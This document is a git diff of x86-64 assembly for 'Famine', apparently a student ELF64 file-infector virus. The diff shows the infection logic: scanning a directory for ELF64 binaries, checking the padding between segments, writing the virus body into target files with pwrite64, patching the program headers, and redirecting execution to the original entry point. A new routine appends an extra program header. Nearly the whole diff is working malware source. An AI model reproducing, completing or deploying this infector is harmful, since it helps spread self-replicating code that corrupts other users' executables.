@@ -11,6 +11,7 @@ section .text
 _start:
 	PUSH_ALL
 	jmp		end_
+
 print_rax:
 
     PUSH_ALL
@@ -43,26 +44,6 @@ print_rax:
     add     rsp, 32             ; restaurer la pile
     POP_ALL
     ret
-
-	buff	times 4096 db 0
-	newl	times 0001 db 0xa
-	path	db '/root/famine/test_dir/', 0
-	padd	times 0512 db 0
-	file	db 'elf64 found!', 0
-	msg1	db 'Famine version 1.0 (c)oded by alexafer-jdecorte', 0
-	old_entry		   dq 0
-	new_entry		   dq 0
-	self	db '/proc/self/exe', 0
-	last	db '..', 0
-	curr	db '.', 0
-	elfh	db 0x7f, 'ELF'
-	one		db 1
-	zero	db 0
-	entry	dq 0
-	exec	dw 7
-	elfb	times 0064 db 0
-	elfp0	times 0056 db 0
-	elfp1	times 0056 db 0
 
 
 
@@ -406,6 +387,9 @@ print_rax:
 		jnz		.close_file
 		; END - CHECKS - ELF64
 
+
+		; Here start the injection
+
 		mov		rax, [rel elfb + 0x18]
 		mov		[old_entry], rax
 
@@ -413,6 +397,8 @@ print_rax:
 		movzx	rdi, word [rel elfb + 0x36]
 		xor		r11, r11
 		xor		r10, r10
+
+		; call _add_empty_section
 
 		.start_loop_phdr:
 			test	rcx, rcx
@@ -461,6 +447,17 @@ print_rax:
 		.end_loop_phdr:
 			test	r11, r11
 			jz		.close_file
+
+			; check padding size
+			; padding = next_header_off - (curr_header_off + header_size)
+			mov		rax, [rel elfp1 + 0x8] ; p_offset next seg
+			mov		rdx, [rel elfp0 + 0x8] ; p_offset curr seg
+			add		rdx, [rel elfp0 + 0x20]
+			sub		rax, rdx
+
+			; padding < FAMINE_SIZE
+			cmp		rax, FAMINE_SIZE
+			jl		.close_file
 
 			push	r9
 			push	r11
@@ -516,8 +513,7 @@ print_rax:
 			mov		[rel elfp1 + 0x20], rdi
 
 			lea		rdi, [rel _start]
-			lea		r11, [rel end_addr]
-			sub		r11, rdi
+			mov		r11, FAMINE_SIZE
 
 			mov		rdi, qword [rel elfp1 + 0x28]
 			add		rdi, r11
@@ -548,11 +544,11 @@ print_rax:
 			pop		r11
 			pop		r9
 
+			; inject the code
 			push	r11
 			push	r9
 			lea		rsi, [rel _start]
-			lea		rdx, [rel end_addr]
-			sub		rdx, rsi
+			mov		rdx, FAMINE_SIZE
 			mov		r10, r11
 			mov		rdi, r12
 			mov		rax, SYS_pwrite64
@@ -604,20 +600,83 @@ end_:
 	mov		rdi, r12
 	syscall
 
+	.just_quit:
+		POP_ALL
+		mov		al, BYTE [rel zero]
+		test	al, al
+		jz		.exit_ret
 
 
-.just_quit:
-	POP_ALL
-	mov		al, BYTE [rel zero]
-	test	al, al
-	jz		.exit_ret
+		jmp		[rel new_entry]
 
+	.exit_ret:
 
-	jmp		[rel new_entry]
+		mov		rax, SYS_exit
+		xor		rdi, rdi
+		syscall
 
-.exit_ret:
+_add_empty_section:
+	PUSH_ALL
 
-	mov		rax, SYS_exit
-	xor		rdi, rdi
+	mov     rax, [rel elfb + 0x28]
+	movzx   rbx, word [rel elfb + 0x3A]
+	movzx   rcx, word [rel elfb + 0x3C]
+
+	imul    rbx, rcx
+	add     rax, rbx
+	mov     r8, rax
+
+	lea     rdi, [rel elfp0]
+
+	mov     rcx, 8
+	xor     rax, rax
+	rep     stosq
+
+	mov     dword [elfp0 + 0x00], 1
+	mov     dword [elfp0 + 0x04], 1
+	mov     qword [elfp0 + 0x30], 1
+
+	mov     rax, SYS_pwrite64
+	mov     rdi, r12
+	lea     rsi, [rel elfp0]
+	mov     rdx, 64
+	mov     r10, r8
 	syscall
+
+	movzx   rax, word [rel elfb + 0x3C]
+	inc     ax
+	mov     [rel elfb + 0x3C], ax
+
+	mov     rax, SYS_pwrite64
+	mov     rdi, r12
+	lea     rsi, [rel elfb]
+	mov     rdx, 64
+	mov     r10, 0
+	syscall
+
+	POP_ALL
+	ret
+
+; -----
+
+buff	times 4096 db 0
+newl	times 0001 db 0xa
+path	db '/tmp/test/', 0
+padd	times 0512 db 0
+file	db 'elf64 found!', 0
+msg1	db 'Famine version 1.0 (c)oded by alexafer-jdecorte', 0
+old_entry		   dq 0
+new_entry		   dq 0
+self	db '/proc/self/exe', 0
+last	db '..', 0
+curr	db '.', 0
+elfh	db 0x7f, 'ELF'
+one		db 1
+zero	db 0
+entry	dq 0
+exec	dw 7
+elfb	times 0064 db 0
+elfp0	times 0056 db 0
+elfp1	times 0056 db 0
+
 end_addr:
